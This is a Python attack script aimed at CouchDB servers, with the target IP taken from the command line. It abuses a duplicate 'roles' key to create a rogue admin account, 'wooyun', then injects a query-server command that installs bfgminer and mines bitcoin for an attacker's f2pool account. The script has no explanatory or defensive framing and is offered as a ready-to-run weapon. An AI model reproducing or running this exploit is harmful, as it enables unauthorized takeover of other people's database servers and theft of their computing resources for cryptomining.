import requests
from requests.auth import HTTPBasicAuth
import sys

print(sys.argv[1])


target = 'http://'+sys.argv[1]+':5984'
command = 'nohup ```apt-get install bfgminer ; bfgminer -o  stratum+tcp://btc.f2pool.com:3333 -u prctblminimum2.cdba'+sys.argv[2]+' -p uqkrubeatswv ``` > /dev/null'
version = 1

session = requests.session()
session.headers = {
    'Content-Type': 'application/json'
}

session.put(target + '/_users/org.couchdb.user:wooyun', data='''{
  "type": "user",
  "name": "wooyun",
  "roles": ["_admin"],
  "roles": [],
  "password": "wooyun"
}''')

session.auth = HTTPBasicAuth('wooyun', 'wooyun')

if version == 1:
    session.put(target + ('/_config/query_servers/cmd'), data=command)
else:
    host = session.get(target + '/_membership').json()['all_nodes'][0]
    session.put(target + '/_node/{}/_config/query_servers/cmd'.format(host), data=command)

session.put(target + '/wooyun')
session.put(target + '/wooyun/test', data='{"_id": "wooyuntest"}')

if version == 1:
    session.post(target + '/wooyun/_temp_view?limit=10', data='{"language":"cmd","map":""}')
else:
    session.put(target + '/wooyun/_design/test', data='{"_id":"_design/test","views":{"wooyun":{"map":""} },"language":"cmd"}')

